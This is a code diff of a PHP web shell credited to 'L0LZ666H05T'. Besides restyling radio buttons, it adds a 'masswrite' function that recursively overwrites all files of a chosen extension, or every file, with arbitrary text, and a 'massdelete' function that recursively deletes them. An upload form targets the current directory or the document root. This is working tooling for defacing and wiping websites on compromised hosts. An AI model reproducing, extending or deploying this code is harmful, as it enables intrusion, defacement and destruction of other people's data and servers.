@@ -278,57 +278,6 @@ td.img {
   -ms-user-select: none;
   user-select: none;
 }
-
-/* Hide the browser's default radio button */
-.container input {
-  position: absolute;
-  opacity: 0;
-  cursor: pointer;
-  float:left;
-}
-
-/* Create a custom radio button */
-.checkmark {
-  position: absolute;
-  top: 0;
-  left: 0;
-  height: 25px;
-  width: 25px;
-  background-color: #eee;
-  border-radius: 50%;
-}
-
-/* On mouse-over, add a grey background color */
-.container:hover input ~ .checkmark {
-  background-color: #ccc;
-}
-
-/* When the radio button is checked, add a blue background */
-.container input:checked ~ .checkmark {
-  background-color: #2196F3;
-}
-
-/* Create the indicator (the dot/circle - hidden when not checked) */
-.checkmark:after {
-  content: "";
-  position: absolute;
-  display: none;
-}
-
-/* Show the indicator (dot/circle) when checked */
-.container input:checked ~ .checkmark:after {
-  display: block;
-}
-
-/* Style the indicator (dot/circle) */
-.container .checkmark:after {
-  top: 9px;
-  left: 9px;
-  width: 8px;
-  height: 8px;
-  border-radius: 50%;
-  background: white;
-}
 a.tools {
   font-family: 'Ubuntu Mono', monospace;
   margin-left:-8px;
@@ -414,6 +363,70 @@ and (min-width : 1824px) {
 only screen and (-webkit-min-device-pixel-ratio : 1.5),
 only screen and (min-device-pixel-ratio : 1.5) {
 /* Styles */
+}
+input[type=checkbox]:not(old),
+input[type=radio   ]:not(old){
+  width     : 2em;
+  margin    : 0;
+  padding   : 0;
+  font-size : 1em;
+  opacity   : 0;
+}
+input[type=checkbox]:not(old) + label,
+input[type=radio   ]:not(old) + label{
+  display      : inline-block;
+  margin-left  : -2em;
+  line-height  : 1.5em;
+}
+input[type=checkbox]:not(old) + label > span,
+input[type=radio   ]:not(old) + label > span{
+  display          : inline-block;
+  width            : 0.875em;
+  height           : 0.875em;
+  margin           : 0.25em 0.5em 0.25em 0.25em;
+  border           : 0.0625em solid rgb(192,192,192);
+  border-radius    : 0.25em;
+  background       : rgb(224,224,224);
+  background-image :    -moz-linear-gradient(rgb(240,240,240),rgb(224,224,224));
+  background-image :     -ms-linear-gradient(rgb(240,240,240),rgb(224,224,224));
+  background-image :      -o-linear-gradient(rgb(240,240,240),rgb(224,224,224));
+  background-image : -webkit-linear-gradient(rgb(240,240,240),rgb(224,224,224));
+  background-image :         linear-gradient(rgb(240,240,240),rgb(224,224,224));
+  vertical-align   : bottom;
+}
+input[type=checkbox]:not(old):checked + label > span,
+input[type=radio   ]:not(old):checked + label > span{
+  background-image :    -moz-linear-gradient(rgb(224,224,224),rgb(240,240,240));
+  background-image :     -ms-linear-gradient(rgb(224,224,224),rgb(240,240,240));
+  background-image :      -o-linear-gradient(rgb(224,224,224),rgb(240,240,240));
+  background-image : -webkit-linear-gradient(rgb(224,224,224),rgb(240,240,240));
+  background-image :         linear-gradient(rgb(224,224,224),rgb(240,240,240));
+}
+input[type=checkbox]:not(old):checked + label > span:before{
+  content     : '✓';
+  display     : block;
+  width       : 1em;
+  color       : rgb(153,204,102);
+  font-size   : 0.875em;
+  line-height : 1em;
+  text-align  : center;
+  text-shadow : 0 0 0.0714em rgb(115,153,77);
+  font-weight : bold;
+}
+
+input[type=radio]:not(old):checked + label > span > span{
+  display          : block;
+  width            : 0.5em;
+  height           : 0.5em;
+  margin           : 0.125em;
+  border           : 0.0625em solid rgb(115,153,77);
+  border-radius    : 0.125em;
+  background       : rgb(153,204,102);
+  background-image :    -moz-linear-gradient(rgb(179,217,140),rgb(153,204,102));
+  background-image :     -ms-linear-gradient(rgb(179,217,140),rgb(153,204,102));
+  background-image :      -o-linear-gradient(rgb(179,217,140),rgb(153,204,102));
+  background-image : -webkit-linear-gradient(rgb(179,217,140),rgb(153,204,102));
+  background-image :         linear-gradient(rgb(179,217,140),rgb(153,204,102));
 }
 </style>
 <body>
@@ -695,11 +708,12 @@ function masswriter($post) {
   <form method="post">
     <tr>
       <td>
-          <select style="width:100%;" name="mode">
-            <option value="" selected>Choose Mode</option>
-            <option value="1">Replace</option>
-            <option value="2">Delete</option>
-          </select>
+        <div align="center">
+          <input id="option" type="radio" name="mode" value="masswrite" checked="checked">
+          <label for="option"><span><span></span></span>masswrite</label>
+          <input id="option" type="radio" name="mode" value="massdelete">
+          <label for="option"><span><span></span></span>massdelete</label>
+        </div>
       </td>
     </tr>
     <tr>
@@ -710,12 +724,12 @@ function masswriter($post) {
     </tr>
     <tr>
       <td>
-        <input style="width:98.9%;" type="text" name="type" placeholder="type ext : php">
+        <input style="width:98.9%;" type="text" name="type" placeholder="type ext : php, if you want execute all please empty this">
       </td>
     </tr>
     <tr>
       <td>
-        <textarea style="width:96.5%;" name="text" placeholder="if you choose mode replace please empty this"></textarea>
+        <textarea style="width:96.5%;" name="text" placeholder="if you choose mode massdelete please empty this"></textarea>
       </td>
     </tr>
     <tr>
@@ -726,53 +740,99 @@ function masswriter($post) {
   </form>
   <?php
   if (isset($_POST['submit'])) {
-    @masswrite($_POST['mode'], $_POST['dir'], $_POST['type'], $_POST['text']);
+    if ($_POST['mode'] == 'masswrite') {
+      @masswrite($_POST['dir'], $_POST['type'], $_POST['text']);
+    }
+    if ($_POST['mode'] == 'massdelete') {
+      @massdelete($_POST['dir'], $_POST['type']);
+    }
   }
   exit();
   }
 }
-function masswrite($mode, $dir, $type, $text) {
-  if ($handle = @opendir($dir)) {
-    while (($file = @readdir($handle)) !== false) {
-      if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)) {
-        switch ($mode) {
-          case '1':
-                $alert  = 'Rewrite';
-                $action = file_put_contents($dir.DIRECTORY_SEPARATOR.$file, $text);
-          break;
-          case '2':
-                $alert  = 'Delete';
-                foreach (scandir($dir) as $_dir) {
-                  if (is_dir($dir.DIRECTORY_SEPARATOR.$_dir)) {
-                    $action = delete($dir.DIRECTORY_SEPARATOR.$_dir);
-                  }
-                }
-              break;
-            } 
-            if ($action) {
-              ?>
-              <tr>
-                <td>
-                  <div class='alert alert-success' role='alert'>
-                    <?php print $dir.DIRECTORY_SEPARATOR?><b><?php print $file ?> success <?php print $alert ?> !</b>
-                  </div>
-                </td>
-              </tr>
-              <?php
+function masswrite($dir, $type, $text) {
+    if(is_writable($dir)) {
+        $getfile = scandir($dir);
+        foreach($getfile as $file) {
+            $path = $dir.DIRECTORY_SEPARATOR.$file;
+            if($file === '.' || filetype($path) == 'file') {
+                if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)):
+                    ?>
+                    <tr>
+                        <td>
+                            <div class="alert alert-success">
+                                <?= $dir.DIRECTORY_SEPARATOR ?><b><?=$file ?> Rewrite Successfully !</b>
+                            </div>
+                        </td>
+                    </tr>
+                    <?php
+                file_put_contents($path, $text);
+                endif;
+            } elseif($file === '..' || filetype($path) == 'file') {
+                if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)):
+                    ?>
+                    <tr>
+                        <td>
+                            <div class="alert alert-success">
+                                <?= $dir.DIRECTORY_SEPARATOR ?><b><?=$file ?> Rewrite Successfully !</b>
+                            </div>
+                        </td>
+                    </tr>
+                    <?php
+                file_put_contents($path, $text);
+                endif;
             } else {
-              ?>
-              <tr>
-                <td>
-                  <div class="alert alert-danger">
-                    permission danied
-                  </div>
-                </td>
-              </tr>
-              <?php
+                if(is_dir($path)) {
+                    if(is_writable($path)) {
+                        @file_put_contents($path, $text);
+                        masswrite($path,$type,$text);
+                    }
+                }
+            }
         }
-      }
     }
-  }
+}
+function massdelete($dir, $type) {
+    if(is_writable($dir)) {
+        $getfile = scandir($dir);
+        foreach($getfile as $file) {
+            $path = $dir.DIRECTORY_SEPARATOR.$file;
+            if($file === '.' || filetype($path) == 'file') {
+                if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)):
+                    ?>
+                    <tr>
+                        <td>
+                            <div class="alert alert-success">
+                                <?= $dir.DIRECTORY_SEPARATOR ?><b><?=$file ?> Delete Successfully !</b>
+                            </div>
+                        </td>
+                    </tr>
+                    <?php
+                unlink($path);
+                endif;
+            } elseif($file === '..' || filetype($path) == 'file') {
+                if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)):
+                    ?>
+                    <tr>
+                        <td>
+                            <div class="alert alert-success">
+                                <?= $dir.DIRECTORY_SEPARATOR ?><b><?=$file ?> Delete Successfully !</b>
+                            </div>
+                        </td>
+                    </tr>
+                    <?php
+                unlink($path);
+                endif;
+            } else {
+                if(is_dir($path)) {
+                    if(is_writable($path)) {
+                        @unlink($path);
+                        massdelete($path,$type);
+                    }
+                }
+            }
+        }
+    }
 }
 function making($post) {
   if ($_GET['do'] == 'making') {
@@ -952,18 +1012,16 @@ function upload($post) {
     <form method="post" enctype="multipart/form-data">
       <tr>
         <td>
-          <center>
-          <label class="container">biasa 
-          ( <?php print @permission(@cwd(), "Writable") ?> )
-            <input type="radio" name="type" value="biasa" checked="checked">
-            <span class="checkmark"></span>
-          </label>
-          <label class="container">home_root 
-          ( <?php print @permission($_SERVER['DOCUMENT_ROOT'], "Writable") ?>
-            <input type="radio" name="type" value="root">
-            <span class="checkmark"></span>
-          </label>
-          </center>
+          <div align="center">
+            <input id="option" type="radio" name="type" value="biasa" checked="checked">
+            <label for="option"><span><span></span></span>biasa
+            ( <?php print @permission(@cwd(), "Writable") ?> )
+            </label>
+            <input id="option" type="radio" name="type" value="root">
+            <label for="option"><span><span></span></span>home_root
+            ( <?php print @permission($_SERVER['DOCUMENT_ROOT'], "Writable") ?>
+            </label>
+        </div>
         </td>
       </tr>
       <tr>
@@ -1372,7 +1430,7 @@ foreach ($getPATH as $file) {
 </tbody>
 <thead>
     <tr>
-        <th colspan="5" style="border:none;">&copy; 2019/<?php print @date("Y") ?> - L0LZ666H05T</th>
+        <th colspan="5" style="border:none;">&copy; copyright 2019 by L0LZ666H05T</th>
     </tr>
 </thead>
 </table>
